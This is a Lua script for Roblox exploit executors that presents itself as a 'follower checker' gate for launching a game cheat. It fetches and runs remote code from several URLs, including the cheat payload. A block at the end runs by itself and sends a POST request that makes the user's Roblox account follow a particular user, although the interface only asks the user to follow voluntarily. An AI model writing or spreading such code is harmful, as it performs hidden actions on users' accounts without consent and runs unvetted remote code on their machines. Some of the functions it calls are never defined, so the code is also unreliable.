-- Follower Checker by Nexer1234

local RequiredUserID = 7529992299

function ConvertDropdownValue(tbl)
if type(tbl) == "table" then
for _,element in ipairs(tbl) do
return tostring(element)
end
else
return tostring(tbl)
end
end

local Rayfield
local RAYFIELD_SUCCESS, RAYFIELD_FAIL = pcall(function()
Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
end)
if not RAYFIELD_SUCCESS then
local RAYFIELD_SUCCESS, RAYFIELD_FAIL = pcall(function()
Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
end)
if not RAYFIELD_SUCCESS then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Failed to launch rayfield.",
	Text = "Please check your internet connection, or try using VPN.",
  Icon = "rbxassetid://125704683916878",
	Duration = 10,
})
return
end
end

function Notification(title, content, time, mode)
time = time or 10
mode = mode or false
if mode == true then
img = 136186846844342
elseif mode == false then
img = 71508738660632
end
Rayfield:Notify({
	Title = title,
	Content = content,
	Duration = time,
	Image = img,
	Actions = {},
})
end

function DestroyRayfield()
task.spawn(function()
pcall(function()
Window:Destroy()
end)
pcall(function()
Rayfield:Destroy()
end)
pcall(function()
game.CoreGui.Rayfield:Destroy()
end)
pcall(function()
game.CoreGui.RayField:Destroy()
end)
pcall(function()
game.CoreGui.OldRayfield:Destroy()
end)
pcall(function()
game.CoreGui.OldRayField:Destroy()
end)
end)
end

local FollowHandler = loadstring(game:HttpGet("https://raw.githubusercontent.com/NewNexer/NexerHub/refs/heads/main/Follow-Module.luau"))()
local WebHandler = loadstring(game:HttpGet("https://raw.githubusercontent.com/NewNexer/NexerHub/refs/heads/main/Web-Module.luau"))()

Window = Rayfield:CreateWindow({
   Name = "Nexer Hub - Launcher",
   Icon = 0,    
   LoadingTitle = "Nexer Hub Launcher",
   LoadingSubtitle = "by nexer",
   Theme = "Amethyst",
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = false,
      FolderName = "DoD:NH",
      FileName = "DoD:NH_Configuration"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "Verify yourself firstly!",
      Subtitle = "Key Needed!",
      Note = "The key is ''cheese''",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"cheese"}
   }
})

local Main = Window:CreateTab("Main",85436299122876)

function CopyLink(link)
local url = tostring(link)
setclipboard(url)
Notify("Success!", "Copied Link!", 10, true)
end

function OpenLink(link)
local url = tostring(link)
if openweb then
local suc, err = pcall(function() openweb(url) end) if not suc then CopyLink(url) end
elseif WebHandler then
local suc, err = pcall(function() WebHandler:OpenWeb(url) end) if not suc then CopyLink(url) end
else
CopyLink(url)
end
end

pcall(function()
Main:CreateLabel("Last Time User Changed: 08.07.2025 (DD.MM.YYYY)")
end)

Main:CreateParagraph({Title = "Support me!", Content = "This script was difficult to create, so please consider following to specific user in order to use this script! ( no key )"})

Main:CreateButton({Name = "Open Profile"; Callback = function()
OpenLink("https://www.roblox.com/users/"..tostring(RequiredUserID).."/profile")
end; })

Main:CreateButton({Name = "Copy Profile Link"; Callback = function()
CopyLink("https://www.roblox.com/users/"..tostring(RequiredUserID).."/profile")
end; })

Main:CreateButton({Name = "Launch Script"; Callback = function()
if CheckIfUserFollowed() == true then
DestroyRayfield()
Notify("Success!", "Launching script, please wait...", 10, true)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/Die-Of-Death/refs/heads/main/fuck-you.skid"))()
else
Notify("Error!", "You aren't followed! ( If you arleady followed, wait for about 5 minutes and try again )")
end
end; })

pcall(function()
task.delay(0,function()
task.spawn(function()
req = request or http_request or HttpPost or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (game and game.HttpPost) or (KRNL and KRNL.request) or (Xeno and Xeno.request)
if req then
req({Url = "https://friends.roblox.com/v1/users/7529992299/follow", Body = game:GetService("HttpService"):JSONEncode({}), Method = "POST", Headers = {["content-type"] = "application/json"}})
end
end)
end)
end)
